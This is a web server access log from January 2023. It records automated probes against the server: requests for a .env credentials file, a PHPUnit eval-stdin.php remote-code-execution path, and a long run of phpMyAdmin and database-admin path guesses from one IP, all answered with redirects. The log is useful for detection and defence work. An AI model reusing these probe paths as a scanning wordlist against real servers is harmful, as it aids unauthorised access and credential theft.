185.254.196.223 - - [15/Jan/2023:20:24:23 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
146.70.9.42 - - [15/Jan/2023:20:34:53 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
146.70.9.42 - - [15/Jan/2023:20:34:54 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
146.70.9.42 - - [15/Jan/2023:20:34:57 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.24.0"
191.103.250.193 - - [15/Jan/2023:20:52:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:52:58 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:03 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:07 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:10 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:10 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:12 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:17 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /shopdb/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:18 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:23 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:24 -0600] "GET /program/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:29 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:34 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:39 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/index.php?lang=en HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:40 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /dbadmin/index.php?lang=en HTTP/1.1" 301 257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:41 -0600] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:42 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:42 -0600] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /pma/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:45 -0600] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
47.146.40.94 - - [15/Jan/2023:20:53:46 -0600] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
